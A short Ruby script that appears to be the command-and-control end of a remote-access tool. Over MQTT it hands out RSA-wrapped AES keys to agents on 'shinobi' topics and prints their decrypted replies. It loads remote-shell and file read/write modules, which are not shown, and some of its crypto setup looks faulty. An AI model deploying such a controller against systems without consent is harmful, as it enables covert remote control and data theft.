require 'paho-mqtt'
require 'msgpacker'
require 'ostruct'
require 'securerandom'
require 'os'
require 'json'

require_relative 'core/encryption'
require_relative 'core/serialization'

require_relative 'inators/remoteshell'
require_relative 'inators/filerw'

cipher = OpenSSL::Cipher::AES.new(128, :CTR)
aes = {
  :key => cipher.random_key,
  :iv => cipher.random_iv,
}

Encryption::AES.config({
  :key_lenght => 128,
  :mode => :CTR,
  :key => aes[:key],
  :iv => aes[:iv]
})

mqtt_settings = {
	:host => 'localhost',
	:port => 1883,
	:persistent => true,
	:blocking => true,
	:reconnect_limit => 3,
	:reconnect_delay => 60,
	:will_topic => 'test',
	:will_payload => 'test',
	:will_qos => 2,
	:will_retain => false
}

mqtt_topics = {
	:rsa									=> "/bu/shinobi/+/rsa",
	:shinobi							=> "/bu/shinobi/+"
}

mqtt_client = PahoMqtt::Client.new(mqtt_settings)

mqtt_client.on_connack do
	mqtt_client.subscribe([mqtt_topics[:rsa], 2])
  mqtt_client.subscribe([mqtt_topics[:shinobi], 2])
end

mqtt_client.add_topic_callback(mqtt_topics[:rsa]) do |packet|
  begin
    topic = packet.topic

    Encryption::RSA.config({
    	:key_size => packet.payload
    })

    packet = Serialization.serialize(aes)
    packet = Encryption::RSA.encrypt(packet)

  	mqtt_client.publish(topic, packet, false, 1)
  rescue

  end
end

mqtt_client.add_topic_callback(mqtt_topics[:shinobi]) do |packet|
  packet = Encryption::AES.decrypt(packet.payload)
  packet = Serialization.deserialize(packet)
	puts packet
end

mqtt_client.connect(mqtt_client.host, mqtt_client.port, mqtt_client.keep_alive, mqtt_client.persistent, mqtt_client.blocking)

loop do
	mqtt_client.loop_read
	mqtt_client.loop_write
end
